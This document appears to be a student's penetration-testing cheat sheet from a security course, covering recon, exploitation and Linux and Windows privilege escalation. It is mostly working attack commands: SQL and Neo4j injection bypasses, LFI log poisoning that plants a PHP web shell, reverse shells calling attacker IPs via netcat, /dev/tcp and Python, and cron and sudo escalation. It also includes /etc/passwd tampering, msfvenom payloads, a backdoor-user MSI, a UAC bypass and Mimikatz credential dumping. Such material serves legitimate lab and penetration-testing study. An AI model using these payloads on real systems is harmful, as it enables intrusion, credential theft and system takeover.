# PTD-Cheatsheet

PTD Unit Cheat Sheet based on class notes
Created using;
- personal notes
- https://github.com/Desm0ndChan/OSCP-cheatsheet
- https://github.com/gurkylee/Linux-Privilege-Escalation-Basics#absuing-sudo-binaries-to-gain-root
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://github.com/swisskyrepo/PayloadsAllTheThings

### Priv Esc Helpers
```
Local Enumeration Tool
Linpeas, Winpeas for informative system enumeration  -> LINPEAS INCLUDES LINUX HELPER
https://github.com/carlospolop/PEASS-ng/tree/master

pspy for linux process monitoring
https://github.com/DominicBreuker/pspy

SharpUp, Seatbelt for windows priv esc vector
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

Rubeus for active directory attack in windows host
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
```
### Python One Liner
``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```
### Searchsploit
```searchsploit -m path/./exploit.py```


## Recon

### Find name and IP
```sudo  nbtscan 192.168.x.x/24```
### Scan all ports that are open and services running
```
nmap -p- --open -sV -A 192.168.x.x
# Full scan
sudo nmap -sV -A -T4 -p- --open 192.168.2.106

IF NMAP IS SLOW
masscan -e tun0 -p1-65535,U:1-65535 10.10.10.x --rate=500
```

### WPscan
```
wpscan --url URL --plugins-detection aggressive -e vp
wpscan --url URL --plugins-detection aggressive -e ap

# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```
### Script to get all ports in readable format
``` sudo nmap -p- --open -sV -A -T4 192.168.2.20 | grep "open" | awk '{print $1, $3}' > filtered_results.txt ```



## Enumerating

### Enum4Linux
``` enum4linux 192.168.x.x ```

### Log Files
```
#Look for cron jobs being recorded in log files.  A cron job may run a certain named file every 5 secondso or so.
#Log file may be output of pspy instance -> Use to find vulnerable folder or file

e.g 2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=796    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:25:02 ^[[31;1mCMD: UID=1000 PID=803    | /bin/sh -c /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=809    | /usr/sbin/CRON -f ^[[0m

In this example product control is a cron job, and is given permissions to run.
Lists the processes that are being launched in real time, including processes owned by root.
```

### Wordy websites
Scan for login details
``` wpscan --url http://wordy/ --enumerate p --enumerate t --enumerate u```
Save all account details in file and run
```wpscan --url //wordy/ -U users -P password```

### SMBClient
```
smbclient \\\\IP\\ -L -N
# If somehow the above command does not work (showing access denied)
smbclient \\\\IP\\ -L -N -I IP
# use the similar command option to login to the share
smbclient \\\\IP\\SHARE -N -I IP
# Login using null session
smbclient \\\\192.168.x.x\\SHARE_NAME -N

If you can enumerate share try cd ../

Enumerate Shares - https://nmap.org/nsedoc/scripts/smb-enum-shares.html
nmap --script smb-enum-shares.nse -p445 <host>
sudo nmap -sU -sS --script smb-enum-shares.nse -p U:137,T:139 <host>

https://nmap.org/nsedoc/scripts/smb-ls.html
nmap -p 445 <ip> --script smb-ls --script-args 'share=c$,path=\temp'
nmap -p 445 <ip> --script smb-enum-shares,smb-ls
```
### smbmap
```
# domain is optional, may put -u '' -p '' to confirm null session access
smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
# depth probably > 5 if you wanna traverse and search deep into a share
smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
```

### Nikto directory finder
``` nikto -h http://IP/```

### Check for SMB Vuln
``` nmap –script smb-vuln* -p 445 192.168.2.15```

### Check shellshock
```
nmap -sV -p80 –script http-shellshock
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
```
### DIRB
```
dirb http://IP/
Use -X .php OR .txt to filter files
```
### Mounting
```
showmount -e 192.168.2.x
sudo mount -t nfs 192.168.2.20:/tmp /mnt/nfs
go to /mnt/nfs
```
### FTP
```
View FTP files in browser to uplod and run
- http://IP/file_name IF the directory is root directory - if not use the path
```
### VNC Viewer
```
vncviewer 192.168.2.20:5901
```
### HYDRA
```
hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.2.20:5901
```
### GoBuster
```
gobuster dir -u http://192.168.2.20 -w /usr/share/wordlists/dirb/big.txt -t 50
gobuster dir -u http://192.168.56.113/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
Aggressive search: gobuster dir -u http://192.168.x.x/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 1 -z -k -l -x "txt,html,php"

Ignore status errors - if no page is found
gobuster dir -u http://10.10.11.57 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k -s 200,204,301,302,307,403,401 -b 302
```
### GET DEFAULT credentials
```
nmap -Pn -n –-script http-default-accounts -p 80 192.168.2.20 –-open -T5 -vv
```
### HTTP Vuln
```
nmap -Pn -n -p80 192.168.2.4 --script http-vuln* --open -T5 -vv
```
### Fuzzing
git clone https://github.com/danielmiessler/SecLists.git
apt -y install seclists
```
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u http://192.168.56.125:8080/administration.php?FUZZ-helloworld -fs 65
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u 192.168.56.125:8080/administration.php?logfile=<name of file>

ffuf -w /path/to/wordlist -u 'https://target'  -H 'Host: FUZZ.TARGET.DOMAIN'
# Find log file for poisoning
cat /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep log > log.txt 
ffuf -u http://${IP}/LFI.php?file=FUZZ -w log.txt -fr "Failed opening" -o fuzz.txt

Discover new paths
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .html,.php,.txt -u 'http://10.0.2.114:8080/FUZZ' -of html -o dir.html -fs 2899

Discover any sort of file based off current URL
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://10.0.2.114:8080/administration.php?FUZZ=anything' -of html -o admin-get.html -fs 65
```
### ZIP cracking
```
wget http://192.168.1.135/backup
file backup
frackzip -D -v -u -p /usr/share/wordlists/rockyou.txt backup
unzip backup
cat dump.sql
```

### SSH User Logins and exploits
```
ssh -i ssh_key user@192.168.x.x
Make sure ssh_key is the private key -> public key can show username though
```

### Login Pages
```
Usr: Admin, Pass: Admin
OR SQL injection
admin' -- -
Bypass MD5 hash username:
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
Password bypass
' or 1=1--+

BURPE SUITE INJECTION
Open login webpage in burpe suite
- attempt login in portswigger browser
- capture login request on proxy HTTP history
- send POST request to repeater
- change username and password values to exploits
```

### Neo4j exploit 
Enumerated login page with burpsuite revealed http website is using neo4j to store login details
- ran login auth in burp suite
- found note // TODO: don't store user accounts in neo4j
- Captured POST /api/auth JSON request in Burp { "username": "admin", "password": "test" }
- Tried Boolean bypass payloads in username and password fields.

CASE:
```
'MATCH (u:USER)-[:SECRET]->(h:SHA1) 
WHERE u.name = '<input>'
RETURN h.value AS hash'
```
- Found db_hash = results[0]["hash"]
- Payload to inject known SHA1 hash that matched password
```
{
  "username": "' OR 1=1 RETURN '5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8' AS hash //",
  "password": "password"
}
```
- obtain valid session token
- modify burp request - in repeater change Cookie in header options to the access token above
- Cookie: access-token=<JWT>

### Log poisoning
Desmonds notes
```
#POC LFI, check /etc/passwd
http://IP/?FI=/etc/passwd
#or
http://IP/?FI=../../../../../../../../etc/passwd
#if there is any user has shell login
http://IP/?FI=/home/user/.ssh/id_rsa
# more advanced filter see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
# RFI, rare since it is not enabled by default
# Setup a http server contains a reverse shell script
# send request then it will be invoked
http://IP/?FI=http://YOUR_IP/YOUR_PAYLOAD
# access log poisoning with ssh
ssh '<?php system($_GET['cmd']); ?>'@IP 
# access log poisoning with http
nc -nv IP HTTP_PORT
<?php system($_GET['cmd']); ?> #<- then click on return key twice and you should see a bad request respond
# SMTP injection
http://IP/FI?=/var/mail/TARGET_USER&cmd=id
# extension append filter
# data, can execute code directly
http://IP/FI?=data://text/plain,<?php phpinfo(); ?>
http://IP/FI?=data://text/plain,<?php shell_exec("PAYLOAD"); ?>
# data and base64 encode to code execution
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
# base64, can check file source
http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
```
IF LFI enabled above will work
LFI tutorial: 
https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956

IF NO LFI
```
To send packets to the authenticated /logViewPage.php first need to grab the PHPSESSIONID
Inspect Page and storage tab -> PHPSESSION ID: 3igpv4q3neckiknb40ou3hrt8o

Use ffuf to fuzz the page using these lists -> /usr/share/seclists/Fuzzing/LFI

ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56

the ../../../../ can be run with different deepness for different files up to 10

Type into URL
http://192.168.56.113/sea.php?file=../../../../var/log/auth

Look for logs with SSH logins or another other logins that are being logged
ssh hello@@192.168.1.136 to check if it logs the ssh login on the above prev URL

Replace the username (hello) with a php system command or an nc check and when we load the log file through our sea.php if the system() function for php is available it will process the php code that loaded from logs
ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
/sea.php?file=../../../../var/log/auth&cmd=ls

ssh 'which+nc' @192.168.1.136
/sea.php?file=../../../../var/log/auth&cmd=ls

On URL : /sea.php?file=../../../../var/log/auth&cmd=ls
If the remote code worked then you can inject a reverse shell

/usr/bin/nc 192.168.1.106 4848 -e /bin/sh
USE AS
/sea.php?file=../../../../var/log/auth&cmd=/usr/bin/nc+192.168.1.106+4848+-e+/bin/sh

connect with listener on kali
```


### if stuck on Server port 80 default page try inspect source code




## Escalate Privileges
## LINUX

### -- Begin checking logged in user capabilities --
```
uname -a 
hostname 
lscpu 
ls /home 
ls /var/www/html 
ls /var/www/
```
----------------------------------------------------------------------------------------------------------------
### SUDO -L (Permissions)
EXAMPLE OUTPUT:
```
find / -perm -u=s -type f 2>/dev/null
```
```
#(root) NOPASSWD: /usr/bin/find
#(root) NOPASSWD: /usr/bin/nmap
#(root) NOPASSWD: /usr/bin/env
#(root) NOPASSWD: /usr/bin/vim
#(root) NOPASSWD: /usr/bin/awk
#(root) NOPASSWD: /usr/bin/perl
```
```
USE https://gtfobins.github.io/gtfobins/php/
```
### IF FIND (/usr/bin/find)
```
sudo find / etc/passwd -exec /bin/bash \;
find . -exec chmod -R 777 /root \;
find . -exec usermod -aG sudo user \;
sudo find /home -exec /bin/bash \;
```
### IF PHP (/usr/bin/php)
```
sudo -u user_name php -r "system('/bin/sh');"
```
### IF NMAP
```
echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
sudo nmap --interactive > !sh
```
### IF SOCAT
```
Attacker = socat file:`tty`,raw,echo=0 tcp-listen:1234
Victim = sudo socat exec:'sh -li',pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
```
### IF MYSQL
```
sudo mysql -e '\! /bin/sh'
```
### IF SSH
```
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```
### IF /usr/bin/python
```
sudo python -c 'import pty;pty.spawn("/bin/bash")'
sudo python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
### /usr/bin/python hijacking
```
(root) SETENV: NOPASSWD: /usr/bin/python3 /home/user/python_script.py
//There is some kinda python lib hijacking. In short, to hijack, follow the steps:
//get the location of python library (which is being used), in our case its /usr/lib/python3.8/
//copy the example.py file to /tmp
//cp /usr/lib/python3.8/example.py /tmp/example.py
//add the reverse shell in the example.py file (where ever you want)
//reverse shell used:
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your_IP",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
//Start the listener
nc -lnvp 1234
//to get the shell, run the command
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/user/python_script.py (which includes example.py library)
//The PYTHONPATH environment variable indicates a directory (or directories), where Python can search for modules to import.
```
### IF /usr/bin/Perl
```
sudo perl -e 'exec "/bin/bash";'
```
More at https://github.com/gurkylee/Linux-Privilege-Escalation-Basics#absuing-sudo-binaries-to-gain-root

### SSH user priv download
```
to download a file from kali IF you have SSH access to the machine

scp -i /mnt/user_sshkey user@192.168.2.105:/folder_name/passwordsDB.kdbx .
scp -i sshKey groundfloor@192.168.2.105:/keepass/passwordsDB.kdbx .
```


-------------------------------------------------------------------------------------------------------------------------------------
### Web Applications
- Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
-  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.

### Backup File
```Navigate to user directory and use ls -lah in backup files to find readable items
# Look for;
- processes run as root
- hashed passwords
- any processes that give you root access after running
```

### tcpdump credentials
```
tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd='
```
### Writable password files
```
If you have write permission to the following files:

/etc/passwd
/etc/shadow
/etc/sudoers

-----------/etc/passwd-------------------------
echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
su - root2
id && whoami
   
// Add new user to the system with GID and UID of 0   
   
OR
   
vi /etc/passwd
Remote X (Password Holder) for root
wg!
su root
id && whoami
  
// Remove root's password  
  
OR

echo root::0:0:root:/root:/bin/bash > /etc/passwd
id && whomai
  
OR

openssl passwd -1 -salt ignite NewRootPassword
Copy output
echo "root2:<output>:0:0:root:/root:/bin/bash" >> /etc/passwd
Replace <output> with the copied output
su root2
id && whoami

------------------/etc/shadow--------------------------------


Run python -c "import crypt; print crypt.crypt('NewRootPassword')"
Copy the output
vi /etc/shadow
// Replace root's hash with the output that you generated
wq!
su root 
id && whoami
   
/etc/sudoers

echo "<username> ALL=(ALL:ALL) ALL" >> /etc/sudoers // Replace "Username" with your current user (Example: www-data)
sudo su
id && whoami
```
### SSH Private Keys
```
find / -name authorized_keys 2> /dev/null              // Any Public Keys?
find / -name id_rsa 2> /dev/null                       // Any SSH private keys?

Copy id_rsa contents of keys found with the above command
Create a local file on your box and paste the content in

chmod 600 <local_file>

ssh -i <local_file> user@IP
   
// Is the key password protected?

ssh2john <local_file> > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Kernel Exploits
```
uname -a // What OS kernel are we using?

// Google Search (Example): 4.4.0-116-generic #140-Ubuntu Expliots OR 4.4.0-116-generic #140-Ubuntu PoC github
// Read the expliots and follow the instructions
// Popular Linux Kernel Exploits

Dirty COW (CVE-2016-5195)
version < 2.6.22
URL: https://dirtycow.ninja/

Other Kernel Expliots
URL: https://github.com/SecWiki/linux-kernel-exploits
```

### Crontabs
```
Enumeration

contab -l
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly

Example 1

Privilege Escalation via Nonexistent File Overwrite

cat /etc/crontab
Output Example: * * * * * root systemupdate.sh
echo 'chmod +s /bin/bash' > /home/user/systemupdate.sh
chmod +x /home/user/systemupdate.sh
Wait a while
/bin/bash -p
id && whoami

Example 2

Privilege Escalation via Root Executable Bash Script

cat /etc/crontab
Output Example: * * * * * root /usr/bin/local/network-test.sh
echo "chmod +s /bin/bash" >> /usr/bin/local/network-test.sh
Wait a while
id && whomai

Example 3

Privilege Escalation via Root Executable Python Script Overwrite

Target

cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.10.10",443)); 
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

// Replace the IP & Port 

// Save & Exit the Script
Attacker

nc -lvnp 443
OR

Target

cat /etc/crontab
Output Example: * * * * * root /var/www/html/web-backup.py
cd /var/www/html/
vi web-backup.py
Add the below to the script:

import os

os.system("chmod +s /bin/bash")

// Save & Exit the Script

Wait a While
/bin/bash -p
id && whoami

Example 5

Privilege Escalation via Tar Cron Job

cat /etc/crontab
Output Example: */1 *   * * *   root tar -zcf /var/backups/html.tgz /var/www/html/*
cd /var/www/html/
echo "chmod +s /bin/bash" > priv.sh
echo "" > "--checkpoint-action=exec=bash priv.sh
echo "" > --checkpoint=1
tar cf archive.tar *

// If it does not work , replace "bash" with "sh"
```

### Escalate priv by adding /bin/bash to script for a user (need pass or sudo permission)
```
sudo -u user /bin/bash /var/www/html/start.sh
```
### Escalate by adding nc to cron job
```
# The cron service searches its spool area (usually /var/spool/cron/crontabs) for crontab files (which are named after user accounts); cron also reads /etc/crontab, 
echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
OR
echo "bash -i >& /dev/tcp/10.8.0.11/3222 0>&1" > /home/user/cron_script.sh
```
### Low privilege printf command to overwrite file contents
```
https://haxor.no/en/article/systemd-backdoor

printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/setup.sh\n\n[Install]\nWantedBy=multi-user.target"
Change to
printf "[Unit]\nDescription=Custom Setup Service\n\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.101/4444 0>&1'\n\n[Install]\nWantedBy=multi-user.target" > service.name

// python3 -c 'import pty;pty.spawn("/bin/bash")'
// sudo systemctl deamon-reload service.name
// sudo systemctl restart 
```
### MySQL exploitations
```
# Spawn a shell from
\!sh mySql - sudo mysql -u root -p

# Check mysql history for login details 
cat .mysql_history'
 ```

### Command line injection URL based
```
http://192.168.56.125:8080/administration.php?logfile=chat.txt;%20id
http://192.168.56.125:8080/administration.php?logfile=cat /etc/passwd
http://192.168.56.125:8080/administration.php?logfile=cd /home ls

http://192.168.56.125:8080/administration.php?logfile= chat.txt; nc IP PORT -e /bin/bash
```

### Run NMAP as root permissions
```
echo "os.execute('/bin/sh')">/tmp/root.nse
sudo nmap --script=/tmp/root.nse
```

### Read Passwd file
```
cat /etc/passwd
If readable -> take password hash of the user:
Follow -> https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/
```

### Create password for passwd file
``` openssl passwd 123 ```

### Overwrite user service with payload
``` 
cp /tmp/exploit.sh /usr/local/bin/service.sh
 ```
### Find username and password in sql file or similar
```
grep -Ei "user|password" dump.sql
```

### Reveal contents of a file Apache HTTP Server 2.4.49 Exploit- Path Traversal and Remote Code Execution
```
# Reveal passwd file
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Reveal private SSH keys for any users found
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
```

### Port forwarding based off running python app
https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-2-port-2

When running linpeas look for any apps that are running on a server

![processes](https://github.com/PellaPella/PTD-Cheatsheet/assets/73531195/2774674d-9ccd-4bf2-8523-b94f08a97352)

Find the app through manual enumeration (do not have method for command yet)

Port forward on victim machine
```
socat TCP-LISTEN:8282,fork TCP:127.0.0.1:8080 &
```

### Cookie by jsonpickle encode and decode
https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/

https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding#port-2-port-2

Capture the cookie in burp suite intercepter with the IP

![image](https://github.com/PellaPella/PTD-Cheatsheet/assets/73531195/4cd8087b-f2f7-4463-8145-287167fb94a0)

Decode the cookie to the right in burpe suite by highlighting it
```
{"py/object": "app.User", "username": "Poseidon"}
```
Pass an evil python code it can be executed and give us a shell of the user its been executed with
```
{"py/object":"__main__.Shell", "py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 192.168.56.105 4949"]], "username": "Poseidon"}
```
Pass to application using burp repeater after base64 encoding it

echo -n 'string' | base64
Target -> choose request -> right click -> send to repeater -> change username to payload




## Escalate Privileges
## WINDOWS

Do some basic enumeration to figure out who we are, what OS this is, what privs we have and what patches have been installed.
```
whoami
net user <username>
 - net user administrator
 - net user admin

CHECK IF net users have RDP access or not - IF they do try use hyrda to bruteforce RDP login
hydra -l user -P /usr/share/wordlists/rockyou.txt rdp://192.168.2.x
Login using : xfreerdp /u:Tim /p:ashley /v:192.168.2.x


systeminfo
net config Workstation 
net users
```
What is running on the machine? 
```
wmic service list full > services.txt
wmic process > processes.txt
```
### Search for file contents
```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*
```

### User privileges
```
whoami /priv

IF SEImpersonate Privilege is enababled THEN perform sweet potato exploit
```

### Search history ConsoleHost_history.txt
```
C:\users\USERNAME\Appdata\Roaming\Microsoft\Windows\Powershell\PSReadline\

type .\Appdata\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

### Processes running as system
```
tasklist /v /fi "username eq system"
```
### List Services
```
net start
wmic service list brief
tasklist /SVC
```
### Enumerate scheduled tasks
```
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Check file Permissions 
```
icacls file_name

Look for 
BUILTIN\Users:(F)(Full access), BUILTIN\Users:(M)(Modify access) or BUILTIN\Users:(W)(Write-only access) in the output.
```
### Running Windows Privesc Check
```
git clone https://github.com/pentestmonkey/windows-privesc-check
cd windows-privesc-check/
python -m SimpleHTTPServer 80

Transfer windows-privesc-check2.exe over to machine

C:\Users\Admin>cd ..
C:\Users>cd Public
C:\Users\Public>cd Downloads
C:\Users\Public\Downloads>windows-privesc-check2.exe --audit -a -o report
windows-privesc-check v2.0svn198 (http://pentestmonkey.net/windows-privesc-check)...
```
### Using sharppup
```
Transfer sharpup to machine
run using .\sharp.exe audit

When a service binary appears - create payload to replace that binary with a reverse shell
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.24 LPORT=443 EXIT_FUNC=thread -f exe-service -o service.exe

overwrite the original service binary
copy .\rev.exe C:\Service_Name\Service_Name.exe

sc start Service_Name

get shell from listener
```
### Running Mimikatz
```
https://github.com/gentilkiwi/mimikatz

wget https://github.com/gentilkiwi/mimikatz/releases/download/2.1.1-20180925/mimikatz_trunk.zip

COPY mimidrv.sys and mimikatz.exe and mimilib.dll to vuln machine

 // IF no interactive shell then:
mimikatz log version "sekurlsa::logonpasswords" exit
 // ELSE
mimikatz.exe
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::logonpasswords
```





### Upgrade meterpreter shell Windows
```
1. Create a windows TCP reverse shell payload executable
// NOTE when connecting to windows initially use port 80 for reverse shell and use nc -nvlp 80

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe
// OR
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe

3. Host the payload on a server from our kali machine (in order to download it from the vul-
nerable machine)

python -m http.server 8000 

3. Download the payload to the vulnerable machine using our powershell reverse shell use
format Invoke-WebRequest OR Curl
// Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"

Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe
OR
curl http://10.8.0.x:8000/rev.exe -o .\rev.exe

// NOTE! may have to do this in public directory as its executable

5. Create another netcat listener on our kali machine
 
6. Execute the new reverse shell payload and capture the shell
./reverse.exe
```

### Reveal unquoted service paths
GUIDE: 
https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287

```
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 

// Look for listed unquoted executable paths 

// e.g. Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto

// If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service

// Check for permissions of folders
icacls “C:\Program Files (x86)\Program Folder”

// If (F = Full Control)  -> We can now place a payload into the folder and start of the service it will run as SYSTEM

Place payloads across windows folders
copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’

Rename-Item reverse.exe Advanced.exe

// To restart and stop services USE
sc stop ServiceName
sc start ServiceName
```

### Insecure File/Folder Permissions
```
// Check permissions for vulnerable service executable path

icacls “C:\Program Files (x86)\Program Folder\A Subfolder”

// Replace executable.exe with a reverse shell payload and restarting the service
```

### Service enumeration
```
# Search Service contents
systemctl cat service.name.sh```
# List all services
systemctl list-unit-files –type=service
# Restart Service
sudo systemctl restart service_name.service
```

### File Capabilities
```
File capabilities are certain permissions you can give to binaries.
Instead of giving a binary ‘sudo’ permission, you can give the binary certain elevated permissions. This is considered
a safer practise than giving the binary full permissions, as sometimes a binary only needs elevated permissions for a few selected functions.
https://manpages.ubuntu.com/manpages/lunar/en/man7/capabilities.7.html

# List all file capabilities
getcap -r / 2>/dev/null

# RSYNC
rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers.
# Copy files using rsync
rsync /etc/passwd /home/destination/
rsync passwd /etc/passwd
```

### SAM and System Files
The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.
```
Generate a hash file for John using pwdump or samdump2.

pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```
Hive Nightmare
Check for the vulnerability using icacls
```
icacls config\SAM

OUTPUT:
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
```
Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
```
mimikatz> token::whoami /full

# List shadow copies available
mimikatz> misc::shadowcopies

# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```
### AlwaysInstallElevated
```
Using the reg query command, you can check the status of the AlwaysInstallElevated registry key for both the user and the machine. If both queries return a value of 0x1, then AlwaysInstallElevated is enabled for both user and machine, indicating the system is vulnerable.

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
OR
Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer

Create MSI package and install

$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

### Bypass UAC
```
whoami /all
```
If user is running at a medium mandatory level (Mandatory Label\Medium Mandatory Level).

Task Scheduler task in order to bypass UAC. We will exploit the task
'DiskCleanup'

The environmental variable that this task uses is %windir%. This variable simply resolves to
"C:\WINDOWS", and is used to find the windows directory. The reason why this task uses this
environmental variable is to run a command that is located within the %windir% directory.

We will change the environmental variable to be:
```
"cmd.exe /c C:\reverse.exe EXEC:cmd.exe,pipes &REM "
```
```
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\reverse.exe EXEC:cmd.exe.pipes &REM " /f
```
start up a netcat listener on port 4444
restart the service
```
schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
```

if not working try
```reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c start C:\reverse.exe" /f```
```schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I```




### Juicy Potato
Versions
- Windows_10_Enterprise
- Windows_10_Pro
- Windows_7_Enterprise
- Windows_8.1_Enterprise
- Windows_Server_2008_R2_Enterprise
- Windows_Server_2012_Datacenter

https://github.com/ohpe/juicy-potato/releases
```
powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.23:8070/JuicyPotato.exe', 'C:\Users\public\JuicyPotato.exe')" -bypass executionpolicy

.\JuicyPotato.exe -h

To run the tool, we need a port number for the COM server and a valid CLSID

Run systeminfo
Find target OS and use link to find CLSIDS of every OS - wuauserv
